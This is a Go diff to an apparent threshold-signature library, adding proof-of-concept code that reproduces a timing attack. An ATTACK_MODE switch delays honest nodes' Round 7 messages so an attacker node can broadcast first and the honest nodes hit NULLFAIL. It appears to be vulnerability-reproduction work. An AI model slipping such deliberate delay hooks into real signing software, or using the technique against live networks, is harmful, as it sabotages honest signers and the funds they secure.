@@ -53,6 +53,10 @@ type TssCommon struct {
 	cachedWireBroadcastMsgLists *sync.Map
 	cachedWireUnicastMsgLists   *sync.Map
 	msgNum                      int
+	// PoC: Attack mode tracking for message indices
+	attackMsgIndices     map[string]int
+	attackMsgIndicesLock *sync.Mutex
+	attackMsgCounter     int
 }
 
 func NewTssCommon(peerID string, broadcastChannel chan *messages.BroadcastMsgChan, conf TssConfig, msgID string, privKey tcrypto.PrivKey, msgNum int) *TssCommon {
@@ -78,7 +82,28 @@ func NewTssCommon(peerID string, broadcastChannel chan *messages.BroadcastMsgCha
 		cachedWireBroadcastMsgLists: &sync.Map{},
 		cachedWireUnicastMsgLists:   &sync.Map{},
 		msgNum:                      msgNum,
+		// PoC: Attack mode tracking
+		attackMsgIndices:     make(map[string]int),
+		attackMsgIndicesLock: &sync.Mutex{},
+		attackMsgCounter:     0,
 	}
+}
+
+// PoC: getAttackMsgIndex returns a consistent index for each message identifier
+// Messages are assigned indices in the order they are first seen
+func (t *TssCommon) getAttackMsgIndex(msgIdentifier string) int {
+	t.attackMsgIndicesLock.Lock()
+	defer t.attackMsgIndicesLock.Unlock()
+
+	if idx, exists := t.attackMsgIndices[msgIdentifier]; exists {
+		return idx
+	}
+
+	// Assign next index
+	idx := t.attackMsgCounter
+	t.attackMsgIndices[msgIdentifier] = idx
+	t.attackMsgCounter++
+	return idx
 }
 
 type BulkWireMsg struct {
@@ -131,13 +156,23 @@ func (t *TssCommon) doTssJob(tssJobChan chan *tssJob, jobWg *sync.WaitGroup) {
 		}
 		round.MsgIdentifier = tssjob.msgIdentifier
 
-		// PoC: ATTACK_MODE timing delay for Round 2 messages
-		// This delays processing of Round 2 messages to cause signature completion ordering mismatch
-		if os.Getenv("ATTACK_MODE") == "true" {
-			if round.RoundMsg == messages.KEYSIGN2Unicast {
-				delayMs := 500 // 500ms delay to amplify timing differences
-				t.logger.Info().Msgf("ATTACK_MODE: Delaying Round 2 message processing by %dms", delayMs)
-				time.Sleep(time.Duration(delayMs) * time.Millisecond)
+		// PoC: INVERTED ATTACK - delay HONEST nodes (not attacker) during Round 7
+		// This allows pig (ATTACK_MODE=true) to complete signing and broadcast first
+		// Honest nodes (dog, cat, fox) complete later and get NULLFAIL when broadcasting
+		// Mainnet showed ~17-18 second delta between NULLFAIL and successful broadcast
+		// Delays: [0]=3000ms, [1]=2000ms, [2]=1000ms, [3]=0ms for message ordering
+		if os.Getenv("ATTACK_MODE") != "true" {
+			if round.RoundMsg == messages.KEYSIGN7 {
+				// Use msgIdentifier to determine message position
+				// msgIdentifier is the base64 encoded message hash
+				// We track seen identifiers to assign indices
+				msgIdx := t.getAttackMsgIndex(tssjob.msgIdentifier)
+				delays := []int{3000, 2000, 1000, 0}
+				if msgIdx < len(delays) {
+					delayMs := delays[msgIdx]
+					t.logger.Info().Msgf("HONEST_NODE: Round 7 message %d delay %dms (identifier: %s)", msgIdx, delayMs, tssjob.msgIdentifier[:20])
+					time.Sleep(time.Duration(delayMs) * time.Millisecond)
+				}
 			}
 		}
 
